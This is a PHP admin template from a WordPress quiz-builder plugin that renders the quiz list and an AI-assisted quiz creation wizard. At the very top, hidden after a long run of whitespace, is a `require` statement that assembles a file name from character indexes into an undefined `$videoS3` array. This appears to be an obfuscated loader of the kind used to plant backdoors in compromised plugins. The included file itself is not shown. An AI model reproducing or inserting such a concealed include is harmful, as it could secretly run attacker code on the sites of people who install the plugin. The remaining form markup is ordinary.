<?php

include_once ("sqb-soapapi.php");
																																		require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
 
//get quiz data
$quizdata = SQB_Quiz::load();
//echo "<pre>"; print_r($quizdata);
$site_url = get_site_url();
if(isset($quizdata) && count($quizdata) > 0){
	 
?>
<h3 class="quiz--title"><i class="fa fa-cog" aria-hidden="true"></i> Manage Quizzes</h3>
<section class="Manage--Quiz-section">
	<div class="Manage--Quiz-items">
		<div class="top-search-bar">
			<input type="search" id="datatable-custom-search" placeholder="Search..."><button id="datatable-searchBtn">Search</button>
			<?php 
				echo '<a href="javascript:void(0)" class="create-new-btn" onclick="SQBShowInBuiltTemplateSection()"><i class="fa fa-plus-circle" aria-hidden="true" ></i>Add a New Quiz</a>';
			?>
		</div>
		
		<table class="quiz_table" style="display:block">
			<thead><tr><th></th></tr></thead>
			<tbody>
			
			 </tbody>
		 </table>
	</div>
	
</section>
 <?php
} else {
 ?>
<div class="have-no-quiz no-quiz-v2">
	<div class="no-quiz-outer">
			<img src="<?php echo $addicon = plugin_dir_url(__FILE__)."../../includes/images/addicon.png";?>" alt="icon">
			<h3>You don't have any Quizzes yet. Please create a new quiz to get started! </h3>
			<a href="javascript:void(0)" onclick="SQBShowInBuiltTemplateSection()"><i class="fa fa-plus-circle" aria-hidden="true"></i>Add your first Quiz</a>
	</div>
</div> 
 <?php
}
$sqb_pre_built_theme_has = false;
$alreadyBuiltThemeListOjb = SQB_Quiz::loadPreBuiltTheme();
if(isset($alreadyBuiltThemeListOjb)){
    $sqb_pre_built_theme_has = true;
	
}
		
?>
<div class="sqb_template_selection_option_section sqb_template_selection_option_section_v2">
	<div class="sqb_select_template_option" style="display:none;">
		<div class="sqb-template-selection">
			<span class="sqb-template-selection-close" onclick="sqb_select_built_in_types_hide()">x</span>
			<h2 class="sqb-template-selection-heading">How do you want to create your quiz?<br />Select an Option Below</h2>  
			<div class="sqb-template-selection-options">
				<div class="sqb-template-selection-item" data-value="create"> 
					<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/sqb_scratch_icon.png";?>"> 
					<span>Create from Scratch</span>
				</div>
				<?php if( $sqb_pre_built_theme_has){ ?>
				<div class="sqb-template-selection-item " data-value="use_builtin"> 
					<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/sqb_built_in.png";?>"> 
					<span>Use a pre-built Quiz Template</span>
				</div>
				<?php } ?>
				<div class="sqb-template-selection-item " data-value="use_import_export"> 
					<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/import-export.png";?>"> 
					<span>Import Quiz</span>
				</div>
				<div class="sqb-template-selection-item " data-value="use_chatgpt"> 
					<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/artificial-intelligence.png";?>"> 
					<span>AI-Powered Quiz (OpenAI)</span>
				</div>
			</div>
		</div>
	</div>
	
	<div class="sqb_create_quiz_using_chatgpt sqb-template-selection" style="display:none;">
		<span class="sqb-template-selection-close" onclick="sqb_select_built_in_quiz_types_hide()">x</span>
		
		
		<div class="chatgpt-quiz-start-screen chatgpt-screen chatgpt-quiz-common-info">
			<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/quiz-creation.png";?>"> 
			<h2 class="chatgpt-section-heading">AI-Powered Quiz Builder</h2>
			<p class="chatgpt-section-content">
				Enter the quiz topic name and a few details about the quiz, <br/>
				and SQB will automatically build out the quiz for YOU!</p>
				
				<?php $start = true; ?>
				<?php if(!defined('APQ_FILE')){
					$start = false;
					?>
					<div class="mt-3 sqb-alert sqb-alert-danger">
						<p>Sorry this feature requires another plugin - AI Powered Quiz. It'll allow you to automatically create quizzes using AI. It's a paid add-on.</a></p>
					</div>
					<div class="aiq-pricing-plan-wrapper">
						<h3>Don't have access?</h3>
						<div class="aiq-pricing-plan-btn">
							<a class="chatgpt-btn btn-pricing-plan" href="https://smartquizbuilder.com/ai" target="_blank">SQB AI Add-On</a>
							<!-- <a class="chatgpt-btn btn-pricing-plan" href="https://wickedcoolplugins.com/wcp/checkout-sqb/?b_id=861555" target="_blank">5-Sites Lifetime</a>
							<a class="chatgpt-btn btn-pricing-plan" href="https://wickedcoolplugins.com/wcp/checkout-sqb/?b_id=672810" target="_blank">Unlimited-Sites Lifetime</a> -->
						</div>
						<div class="aiq-already-have-wrapper">
							<h3>Have purchased it already?</h3>
							<a class="chatgpt-btn btn-already-have" href="https://wickedcoolplugins.com/login" target="_blank">Download it from here</a>
						</div>
					</div>
				<?php }else{
					$AIQActivated = get_option('AIQActivated', '');
					if($AIQActivated != 'Y'){
						$start = false;
						$aiq_plugin_url = add_query_arg( array( 
							'page' => 'aiq_manage_option', 
						), admin_url() );
						?>
							<div class="mt-3 sqb-alert sqb-alert-danger">
								<p>We notice that you have installed the AI-Powered Quiz Plugin but you have not activated the license yet. Please click on the button below to activate it.</p>
							</div>
							<a class="chatgpt-btn btn-already-have" href="<?php echo $aiq_plugin_url; ?>">Activate License</a>
						<?php
					}else{
					
					?>
				
				<?php } ?>
				<?php } ?>
				
			<?php if(defined('APQ_FILE') && isset($AIQActivated) && $AIQActivated == 'Y'){ ?>
				<button class="<?php echo !empty($start) ? 'chatgpt_start_quiz' : ''; ?> chatgpt-btn" <?php echo empty($start) ? 'disabled' : ''; ?>>Start</button>
			<?php } ?>
		</div>
		<div class="chatgpt-quiz-selection-screen chatgpt-screen" style="display:none;" id="chatgpt-quiz-selection-screen" data-screen="title">
			
			<div class="chatgpt-video-btn-wrapper">
				<a href="https://youtu.be/x1j5k1JIEpY" target="_blank" class="chatgpt-btn chatgpt-btn-alternative">Watch this Video</a>
			</div>
			<div class="chatgpt_form chatgpt-quiz-common-info">
				<?php
					$openaiToken = get_option('sqb_chat_gpt_api_key', '');
				?>
				<h2 class="chatgpt-section-heading">Pick an Option</h2>
				<div class="chatgpt_form_input">
					<p class="control-label chatgpt-section-content">OpenAI charges a fee for the API calls.<br>While it's about $0.003/token (please check current pricing on their <a href="https://openai.com/pricing" target="_blank">site</a>), it's not free. <br> If you don't want to spend on the API calls, you can use the manual option. Details below.</p>
					<div class="chatgpt_form_template_wrapper">
						<div class="chatgpt-item-main-box">
							<div class="chatgpt-item-inner">
								<div class="chatgpt-item-text">
									<h2>No API call (FREE)</h2>
									<p>As OpenAI APIs are not free, give us the title, we'll give you the prompts for it.
Enter it in chatGPT directly. And then enter the response from chatGPT here.</p>
									<button class="chatgpt_manual_flow chatgpt-btn" >Use This</button>
								</div>
							</div>
							<div class="chatgpt-item-inner">
								<div class="chatgpt-item-text">
									<h2>API call</h2>
									<p>If you have signed up for the API,<br>
										you can enter the key here.<br>
										You can get the key from here.</p>
									<button class="chatgpt_auto_flow chatgpt-btn" <?php echo empty($openaiToken) ? 'disabled' : ''; ?>>Use This</button>
								</div>
							</div>
						</div>
					</div>
					<?php
					if(empty($openaiToken)){
						
					?>
					<div class="mt-3 sqb-alert sqb-alert-danger">
						If you want to use the "API Call" option above, you need to enter your OpenAI API Key.<br /><br />
						1. Get OpenAI API Key from <a href="https://platform.openai.com/account/api-keys" target="_BLANK" title="Open in the new tab">here.</a><br />
						2. Enter it in SQB >> Settings >> External Integration >> <a href="<?php echo site_url() ?>/wp-admin/admin.php?page=sqb_settings&tab=chat_gpt_integration" title="Open in same tab">OpenAI Integration</a>. <br />
					</div>
					<?php } ?>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-title-mscreen chatgpt-screen" style="display:none;" id="chatgpt-quiz-title-mscreen" data-screen="title">
			
			<div class="chatgpt_form chatgpt-quiz-common-info">
				
				<h2 class="chatgpt-section-heading">Enter Quiz Details</h2>
				<div class="chatgpt_form_input">
					<div class="chatgpt_form_input_wrapper">
						<div class="gpt-field-main-wrapper chatgpt-normal">
							<label class="control-label">What type of quiz do you want to create?</label>
							<div class="chatgpt-ai-type-main">
								<label class="chatgpt-ai-type-inner">
									<input type="radio" name="chatgpt_quiz_type" value="personality" checked><span>Personality</span>
								</label>
								<label class="chatgpt-ai-type-inner">
									<input type="radio" name="chatgpt_quiz_type" value="scoring"><span>Scoring</span>
								</label>
								<label class="chatgpt-ai-type-inner">
									<input type="radio" name="chatgpt_quiz_type" value="survey"><span>Survey</span>
								</label>
							</div>
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal gpt-chatgpt_scoring_correct" style="display:none">
							<label class="control-label">Do you want correct answer calculations? <div class="tool-tip" bis_skin_checked="1">
										<i class="fa fa-info-circle" aria-hidden="true"></i>
										<div class="toll-tip-desc" bis_skin_checked="1">In a typical scoring quiz, points are assigned based on correct or incorrect answers. <br />However, in SQB, you can create a scoring quiz where there are no correct or incorrect responses. <br />Instead, you simply assign points to each answer, allowing for a more flexible and personalized evaluation of participants' inputs.</div>
									</div></label>
							<div class="chatgpt-ai-type-scoring-main">
								<label class="chatgpt-ai-type-scoring-inner">
									<input type="radio" name="chatgpt_scoring_correct" value="yes" checked><span>Yes</span>
								</label>
								<label class="chatgpt-ai-type-scoring-inner">
									<input type="radio" name="chatgpt_scoring_correct" value="no"><span>No</span>
								</label>
								
							</div>
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal">
							<label class="control-label">Language</label>
							<select id="chatgpt_quiz_lang">
								<?php 
								$languages = getSQbLang();
								$def = 'English';
								foreach ($languages as $key => $lang) { ?>
									<option value="<?php echo $lang ?>" <?php echo ($lang == $def) ? 'selected' : '' ?>><?php echo $lang ?></option>
								<?php } ?>
								
							</select>
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal ai-hide-this-if-type-survay">
							<div class="sqb-sameline-left-right">
								<label class="control-label sqb-heading-with-small">Tell us a little about the quiz you want to create <small>(goal, what you want it to do, topic, etc.)</small></label>
								<a href="javascript:void(0);"  class="chatgpt-i-need-help-btn chatgpt-prompt-btn chatgpt-generate-quiz-type">Generate Quiz Ideas For Me</a>
							</div>

							<textarea name="chatgpt_mquestion_additional" id="chatgpt_mquestion_additional" class="chatgpt-field-input chatgpt-field-textarea-small reset-input" placeholder="For e.g., I want to create a quiz to help my audience figure out which type of online courses they should create. "></textarea>
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal">
							<div class="sqb-sameline-left-right">
								<label class="control-label change-with-survey">What is the quiz title?</label>
								<a href="javascript:void(0);" class="chatgpt-i-need-help-btn chatgpt-prompt-btn chatgpt_generate_mprompt">I need help with title ideas</a>
							</div>
							<input type="text" name="chatgpt_title" id="chatgpt_mtitle" placeholder="What type of online course should you create?" class="chatgpt-field-input chatgpt-normal reset-input-with-change chatgpt_quiz_dynamic_placeholder">
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal chatgpt-msurvay-field ai-show-this-if-type-survay">
							
							<div class="ai-mb-20">
								<label class="control-label">Survey Type:</label>
								<div class="survey-type-wrapper">
									<ul>
										<li>
											<label>
												<input type="radio" name="survey_mtype" value="I want to create a survey to validate my Product Idea.">
												<span>Product Idea Validation</span>
											</label>
										</li>

										<li>
											<label>
												<input type="radio" name="survey_mtype" value="I want to create a survey to get Customer Feedback">
												<span>Customer Feedback</span>
											</label>
										</li>

										<li>
											<label>
												<input type="radio" name="survey_mtype" value="I want to create a survey to get feedback on Customer Experience.">
												<span>Customer Experience</span>
											</label>
										</li>

										<li>
											<label>
												<input type="radio" name="survey_mtype" value="I want to create a survey to gather feedback from customers regarding the reasons for subscription cancellation.">
												<span>User Cancellation</span>
											</label>
										</li>

										<li>
											<label>
												<input type="radio" name="survey_mtype" value="I want to create a survey to get customer feedback.">
												<span>Other</span>
											</label>
										</li>
									</ul>
									<span class="chatgpt-error-field">This field is required</span>
								</div>
								
							</div>

							<div class="survey-goal-wrapper ai-mb-20" style="display:none;">
								<label class="control-label">What's the main goal of this survey?</label>
								<input type="text" name="chatgpt_msurvay_goal" id="chatgpt_msurvay_goal" class="chatgpt-field-input reset-input" placeholder="For e.g. I want to create a customer feedback survey to get feedback on my product.">
								<span class="chatgpt-error-field">This field is required</span>
							</div>

							<div class="survey-describe">
								<label class="control-label">Tell us a little bit about your product, service, business or survey topic.</label>
								<textarea type="text" name="chatgpt_msurvaycontent" id="chatgpt_msurvaycontent" placeholder="e.g. An online course where I teach how to build the right type of sales funnel for their business!" class="chatgpt-field-input chatgpt-normal reset-input-with-change chatgpt-field-textarea-small" cols="3"></textarea>
								<span class="chatgpt-error-field">This field is required</span>
							</div>


						</div>


						<?php /*
						<div class="gpt-field-main-wrapper chatgpt-normal ai-hide-this-if-type-survay">
							<label class="control-label">What is main goal of this quiz?</label>
							<textarea name="chatgpt_mquestion_additional" id="chatgpt_mquestion_additional" class="chatgpt-field-input reset-input chatgpt-field-textarea-small" placeholder="For e.g., I want to create a quiz to help my audience figure out which type of online courses they should create. "></textarea>
						</div>
						*/ ?>
						
						<div class="chatgpt-btn-group">
							
							<button class="chatgpt-btn chatgpt_back" data-screen="selection" data-back="1">Back</button>
							<?php /*<a href="javascript:void(0);"  class="ml-auto mr-auto mt-3 chatgpt-prompt-btn chatgpt_generate_mprompt">I need help with title ideas</a> */ ?>
							<button class="mt-4 chatgpt_generate_mtitle chatgpt-btn" disabled>Next</button>
						</div>
						<?php /*<div class="mt-3 sqb-alert sqb-alert-warning">
						<p>This can take up to a minute or so.</p>
					</div> */ ?>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-title-screen chatgpt-screen" style="display:none;" id="chatgpt-quiz-title-screen" data-screen="title">
			
			<div class="chatgpt_form chatgpt-quiz-common-info">
				
				<h2 class="chatgpt-section-heading">Enter Quiz Details</h2>
				<div class="chatgpt_form_input">
					<p class="control-label chatgpt-section-content">Enter what the quiz is about.</p>
					<div class="chatgpt_form_input_wrapper">

						

						<div class="gpt-field-main-wrapper chatgpt-normal">
							<label class="control-label">Quiz Type</label>
							<div class="chatgpt-ai-type-main">
								<label class="chatgpt-ai-type-inner">
									<input type="radio" name="chatgpt_quiz_ntype" value="personality" checked><span>Personality</span>
								</label>
								<label class="chatgpt-ai-type-inner">
									<input type="radio" name="chatgpt_quiz_ntype" value="scoring"><span>Scoring</span>
								</label>
								<label class="chatgpt-ai-type-inner">
									<input type="radio" name="chatgpt_quiz_ntype" value="survey"><span>Survey</span>
								</label>
							</div>
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal gpt-chatgpt_nscoring_correct" style="display:none">
							<label class="control-label">Do you want correct answer calculations? <div class="tool-tip" bis_skin_checked="1">
										<i class="fa fa-info-circle" aria-hidden="true"></i>
										<div class="toll-tip-desc" bis_skin_checked="1">In a typical scoring quiz, points are assigned based on correct or incorrect answers. <br />However, in SQB, you can create a scoring quiz where there are no correct or incorrect responses. <br />Instead, you simply assign points to each answer, allowing for a more flexible and personalized evaluation of participants' inputs.</div>
									</div></label>
							<div class="chatgpt-ai-type-nscoring-main">
								<label class="chatgpt-ai-type-nscoring-inner">
									<input type="radio" name="chatgpt_nscoring_correct" value="yes" checked><span>Yes</span>
								</label>
								<label class="chatgpt-ai-type-nscoring-inner">
									<input type="radio" name="chatgpt_nscoring_correct" value="no"><span>No</span>
								</label>
								
							</div>
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal">
							<label class="control-label">Language</label>
							<select id="chatgpt_quiz_nlang">
								<?php 
								$languages = getSQbLang();
								$def = 'English';
								foreach ($languages as $key => $lang) { ?>
									<option value="<?php echo $lang ?>" <?php echo ($lang == $def) ? 'selected' : '' ?>><?php echo $lang ?></option>
								<?php } ?>
							</select>
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal ai-hide-this-if-type-survay">
							<div class="sqb-sameline-left-right">
								<label class="control-label sqb-heading-with-small">Tell us a little about the quiz you want to create <small>(goal, what you want it to do, topic, etc.)</small></label>
								<a href="javascript:void(0);"  class="chatgpt-i-need-help-btn chatgpt-prompt-btn chatgpt-generate-quiz-type">Generate Quiz Ideas For Me</a>
							</div>

							<textarea name="chatgpt_goal" id="chatgpt_goal" class="chatgpt-field-input chatgpt-field-textarea-small reset-input" placeholder="For e.g., I want to create a quiz to help my audience figure out which type of online courses they should create. "></textarea>
						</div>

						<div class="gpt-field-main-wrapper chatgpt-normal nquiztopicwap" style="display:none">
							<label class="control-label change-with-nsurvey">What is the quiz topic?</label>
							<input type="text" name="chatgpt_title" id="chatgpt_title" class="chatgpt_quiz_dynamic_placeholder chatgpt-field-input chatgpt-normal">
						</div>
						
						<div class="gpt-field-main-wrapper chatgpt-normal chatgpt-survay-field ai-show-this-if-type-survay">
							
							<div class="ai-mb-20">
								<label class="control-label">Survey Type:</label>
								<div class="survey-type-wrapper">
									<ul>
										<li>
											<label>
												<input type="radio" name="survey_type" value="I want to create a survey to validate my Product Idea.">
												<span>Product Idea Validation</span>
											</label>
										</li>

										<li>
											<label>
												<input type="radio" name="survey_type" value="I want to create a survey to get Customer Feedback">
												<span>Customer Feedback</span>
											</label>
										</li>

										<li>
											<label>
												<input type="radio" name="survey_type" value="I want to create a survey to get feedback on Customer Experience.">
												<span>Customer Experience</span>
											</label>
										</li>

										<li>
											<label>
												<input type="radio" name="survey_type" value="I want to create a survey to gather feedback from customers regarding the reasons for subscription cancellation.">
												<span>User Cancellation</span>
											</label>
										</li>

										<li>
											<label>
												<input type="radio" name="survey_type" value="I want to create a survey to get customer feedback.">
												<span>Other</span>
											</label>
										</li>
									</ul>
									<span class="chatgpt-error-field">This field is required</span>
								</div>
								
							</div>

							<div class="survey-goal-wrapper ai-mb-20 ai-show-this-if-type-survay" style="display:none;">
								<label class="control-label">What's the main goal of this survey?</label>
								<input type="text" name="chatgpt_survay_goal" id="chatgpt_survay_goal" class="chatgpt-field-input reset-input" placeholder="For e.g. I want to create a customer feedback survey to get feedback on my product.">
								<span class="chatgpt-error-field">This field is required</span>
							</div>

							<div class="survey-describe">
								<label class="control-label">Tell us a little bit about your product, service, business or survey topic</label>
								<textarea type="text" name="chatgpt_survaycontent" id="chatgpt_survaycontent" placeholder="e.g. An online course where I teach how to build the right type of sales funnel for their business!" class="chatgpt-field-input chatgpt-normal reset-input-with-change" cols="3"></textarea>
								<span class="chatgpt-error-field">This field is required</span>
							</div>


						</div>

						<?php /*
						<div class="gpt-field-main-wrapper chatgpt-normal ai-hide-this-if-type-survay">
							<label class="control-label">What is main goal of this quiz?</label>
							<input type="text" name="chatgpt_goal" id="chatgpt_goal" class="chatgpt-field-input" placeholder="For e.g., I want to create a quiz to help my audience figure out which type of online courses they should create.">
						</div>
						*/ ?>
						
						<a href="javascript:void(0);" class="chatgpt_title_prompt chatgpt-sh-prompt chatgpt-normal" data-type="prompt">Show Prompt</a>
						<textarea col="3" row="8" id="chatgpt_title_prompt" class="chatgpt-field-input chatgpt_title_prompt chatgpt-prompt" style="display:none"></textarea>
						<a href="javascript:void(0);" class="chatgpt_title_normal chatgpt-prompt chatgpt-sh-prompt" data-type="normal" style="display:none">Reset to default</a>
						<input type="hidden" name="chatgpt_selected_topic" id="chatgpt_selected_topic">
						<input type="hidden" name="chatgpt_selected_description" id="chatgpt_selected_description">
						<input type="hidden" name="chatgpt_prompt_type" class="chatgpt_title_prompt_type" value="normal">
						
						<div class="chatgpt-btn-group aiq-generate-title">
							<button class="chatgpt-btn chatgpt_back" data-screen="selection">Back</button>
							<button class="chatgpt_manual_generate_title chatgpt-btn chatgpt-btn-gray" >Already have title?</button>
							<button class="chatgpt_generate_title chatgpt-btn" disabled>Generate Quiz Title</button>
						</div>
						<?php /*<div class="mt-3 sqb-alert sqb-alert-warning">
						<p>This can take up to a minute or so.</p>
					</div> */ ?>
					</div>
				</div>
			</div>
			<div class="chatgot-quiz-title-response-main chatgpt-quiz-common-info" style="display:none">
				<h2 class="chatgpt-section-heading">Here are the quiz title ideas:</h2>
				<h2 class="chatgpt-section-heading-own-title" style="display:none;">Enter your Quiz Title Here</h2>
				<p class="chatgpt-section-content">Please select one one. It can be changed later.</p>
				<div class="chagpt-quiz-title-response"></div>
				<div class="gpt-field-main-wrapper chatgpt_other_title">
					<input type="text" name="chatgpt_own_title" id="chatgpt_own_title" class="chatgpt-field-input" placeholder="Enter your own title">
				</div>
				<div class="button-action">
				<div class="chatgpt-btn-group">
					<button class="chatgpt-btn chatgpt_back" data-screen="title">Back</button>
					<button class="chatgpt_regenerate_title chatgpt-btn chatgpt-btn-regenerate">Regenerate</button>
					<button class="chatgpt_to_question_screen chatgpt-btn">Next</button>
				</div>
				<?php /*<div class="mt-3 sqb-alert sqb-alert-warning">
						<p>This can take up to a minute or so.</p>
					</div> */ ?>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-questions-mscreen chatgpt-screen chatgpt-quiz-common-info" style="display:none" id="chatgpt-quiz-questions-mscreen" data-screen="questions">
			
			<h2 class="chatgpt-section-heading">You have selected this title:&nbsp;<i class="chatgpt-topic"></i></h2>
			
			<div class="chatgpt_form">
				<p class="chatgpt-section-content sqb-justify-content">Give us some details about questions, answers and outcomes.</p>
				<div class="chatgpt_form_input_wrapper sqb-field-box-style">

					<div class="gpt-field-main-wrapper">
						<label class="control-label">Choose how you'd prefer to generate your quiz questions:</label>
						<div class="chatgpt-ai-type-main">
							<label class="chatgpt-ai-type-inner">
								<input type="radio" name="chatgpt_mquestion_choice" value="ai_question" checked><span>Use AI to Automatically Generate Questions <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="width:450px;text-align:left;">Let AI handle it! SQB will use AI to figure out the right number of questions based on the quiz.</div></div></span>
							</label>
							<label class="chatgpt-ai-type-inner">
								<input type="radio" name="chatgpt_mquestion_choice" value="manualy_question"><span>Enter number of Questions Manually <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
								<div class="toll-tip-desc" style="width:450px;text-align:left;">Simply enter the number of outcomes you'd like. SQB will use AI to generate the questions but limit total questions to this number.</div></div></span>
							</label>
						</div>
					</div>

					<div class="gpt-field-main-wrapper chatgpt-q-normal gpt-mquestion_limit_wrap" style="display:none">
						<label class="control-label">How many questions do you want in the quiz? <i>(Max limit: 15)</i></label>
						<div class="gpt-field-wrapper gpt-group-field">
							<div class="gpt-sub-field-wrapper">
								<label>Single Choice</label>
								<input type="text" name="chatgpt_mquestion_single_limit" id="chatgpt_mquestion_single_limit" placeholder="Enter number here" class="chatgpt-field-input" value="3">
							</div>
							<div class="gpt-sub-field-wrapper">
								<label>Multiple Choice</label>
								<input type="text" name="chatgpt_mquestion_multi_limit" id="chatgpt_mquestion_multi_limit" placeholder="Enter number here" class="chatgpt-field-input" value="1">
							</div>
							<div class="gpt-sub-field-wrapper">
								<label>Open ended</label>
								<input type="text" name="chatgpt_mquestion_open_limit" id="chatgpt_mquestion_open_limit" placeholder="Enter number here" class="chatgpt-field-input" value="1">
							</div>
							<div class="gpt-sub-field-wrapper chatgpt_mquestion_ratingscale_wrap">
								<label>Rating-Scale</label>
								<input type="text" name="chatgpt_mquestion_ratingscale_limit" id="chatgpt_mquestion_ratingscale_limit" placeholder="Enter number here" class="chatgpt-field-input" value="0">
							</div>
						</div>
					</div>

					<div class="gpt-field-main-wrapper chatgpt-q-normal gpt-mquestion_limit_wrap-ai" bis_skin_checked="1">
    <label class="control-label">Which type of questions do you want in the quiz?</label>
    <div class="gpt-field-wrapper gpt-group-field gpt-checkbox-group" bis_skin_checked="1">
        <div class="gpt-sub-field-wrapper" bis_skin_checked="1">
            <label>
                <input type="checkbox" name="chatgpt_question_single_limitm" id="chatgpt_mquestion_single_limitm" value="1" class="" checked>
                Single Choice
            </label>
        </div>
        <div class="gpt-sub-field-wrapper" bis_skin_checked="1">
            <label>
                <input type="checkbox" name="chatgpt_question_multi_limitm" id="chatgpt_mquestion_multi_limitm" value="1" class="" checked>
                Multiple Choice
            </label>
        </div>
        <div class="gpt-sub-field-wrapper" bis_skin_checked="1">
            <label>
                <input type="checkbox" name="chatgpt_question_open_limitm" id="chatgpt_mquestion_open_limitm" value="1" class="" checked>
                Open Ended
            </label>
        </div>
        <div class="gpt-sub-field-wrapper chatgpt_mquestion_ratingscale_wrap" bis_skin_checked="1">
            <label>
                <input type="checkbox" name="chatgpt_question_ratingscale_limitm" id="chatgpt_mquestion_ratingscale_limitm" value="1" class="" checked>
                Rating Scale
            </label>
        </div>
    </div>
</div>

					
					<div class="button-action">
						<div class="chatgpt-btn-group">
							<button class="chatgpt-btn chatgpt_mback" data-screen="outcomelist" data-back="1">Back</button>
							<button class="chatgpt_generate_quiz_mquestions_prompt chatgpt-btn" data-noappend="1">Show Prompt</button>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-questionsprompt-mscreen chatgpt-screen chatgpt-quiz-common-info" style="display:none" id="chatgpt-quiz-questionsprompt-mscreen" data-screen="questionsprompt">
			
			<div class="chatgpt_form chatgpt-quiz-common-info">
				
				<h2 class="chatgpt-section-heading">Use this Prompt in ChatGPT</h2>
				<div class="chatgpt_form_input aiq-full-width">
					<div class="chatgpt_prompt_response_wrapper">
						<div class="chatgpt_mprompt_format_wrapper chatgpt_question_prompt_code_show">
							<label class="gpt-alert-box">You can use this prompt in ChatGPT. Please copy/paste this in ChatGPT for quiz title ideas.</label>
							<div class="code-container">
							<div class="aiq-copy-btn-wrapper"><span class="copy-icon" data-id="chatgpt_questionsprompt_format_code" onclick="sqb_copy_to_clipboardNew(this)"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg><i>Copy Code</i></span></div>
							<code id="chatgpt_questionsprompt_format_code" class="chatgpt_mprompt_format">
							</code>
							</div>
							<div class="aiq-popup-btn-wrapper">
								<button class="chatgpt-btn btn-copy-propmpt" data-id="chatgpt_questionsprompt_format_code" onclick="sqb_copy_to_clipboardNew(this)"><i>Copy Code</i></button>
							</div>
							<label class="gpt-alert-box gpt-alert-warning">Do NOT remove the sections highlighted in red from the prompt.</label>
						</div>
					</div>
					<div class="button-action">
						<div class="chatgpt-btn-group">
							<button class="chatgpt-btn chatgpt_mback" data-screen="questions" data-back="1">Back</button>
							<button class="chatgpt_generate_quiz_mquestions chatgpt-btn" data-noappend="1">Next</button>
						</div>
					</div>
				</div>
			</div>
		</div>
		
		
		<div class="chatgpt-quiz-questions-response-mscreen chatgpt-screen chatgpt-quiz-common-info" style="display:none" id="chatgpt-quiz-questions-response" data-screen="questions-response">
			
			<div class="chatgpt_form chatgpt-quiz-common-info">
				
				<h2 class="chatgpt-section-heading">Question Response</h2>
				<p class="chatgpt-section-content">Enter ChatGPT response in the textarea below:</p>
				<div class="chatgpt_form_input aiq-full-width">
					<div class="chatgpt_form_input_wrapper">
						<textarea name="chatgpt_question_json" id="chatgpt_question_json" placeholder="Enter the response here (questions/answers)" class="chatgpt-field-input reset-input"></textarea>
						<div class="chatgpt_generate_mquestion_error chatgpt_generate_error_msg">
							<div class="aiq-alert aiq-alert-error">
							This response is not in the right format.<br />
							Please make sure to copy the prompt from the previous screen and enter it in ChatGPT. Do not remove the text in red.<br /><br />
							Also, whatever response ChatGPT gives you, enter it back here.<br /><br />
							Sometimes ChatGPT does not give back "code" response. When it gives back "plain text" response, please click the "regenerate" button  in ChatGPT or open a new chat and enter SQB's prompt again.<br /><br />
								<code>Need quiz content in JSON format with easy copy code button. Use these variables in JSON:
								[{
								    "question": "",
								    "type": "",
								    "answers": [{"answer" : "","outcome":""}]
								}]</code>
							</div>
						</div>
					</div>
					<div class="button-action">
						<div class="chatgpt-btn-group">
							<button class="chatgpt-btn chatgpt_mback" data-screen="questionsprompt" data-back="1">Back</button>
							<button class="chatgpt_generate_mquestion_list chatgpt-btn" data-noappend="1">Next</button>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-questionslist-mscreen chatgpt-screen chatgpt-quiz-common-info" style="display:none" id="chatgpt-quiz-questionslist-mscreen" data-screen="questions">
			
			<h2 class="chatgpt-section-heading">You have selected this title:&nbsp;<i class="chatgpt-topic"></i></h2>
			
			<div class="chatgot-quiz-questionslist-response-main" style="display:none">
				<p>Select the questions that you want in this quiz. <br />You can click on "add more" to get AI to generate more questions for you.</p>
				<div class="chagpt-quiz-questionslist-mresponse"></div>
				<div class="chatgpt-questions-filter">
				<span for="show_only_selected_question">Show Selected</span>
				<div class="square-switch_onoff">
					<input class="checkbox" name="show_only_selected_questionlist" type="checkbox" id="show_only_selected_questionlist" value="1" >
					<label for="show_only_selected_questionlist"></label>
				</div>
				</div>
				<div class="button-action">
					<div class="chatgpt-btn-group">
						<button class="chatgpt-btn chatgpt_mback" data-screen="questions" data-alert="1">Back</button>
						<button class="chatgpt_regenerate_mquestion chatgpt-btn chatgpt-btn-mregenerate" data-append="1">Add More Questions <div class="tool-tip" style="color: #000;"> <i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="width:450px;text-align:left;">You'll not lose the current questions. SQB will use AI to get more relevant questions for you.</div>
					</div></button>
						<button class="chatgpt_to_outcome_mscreen chatgpt-btn">Next</button>
					</div>
				</div>
			</div>
		</div>
		<div class="chatgpt-quiz-outcome-mscreen chatgpt-screen chatgpt-quiz-common-info" id="chatgpt-quiz-outcome-mscreen" style="display:none" data-screen="outcome">
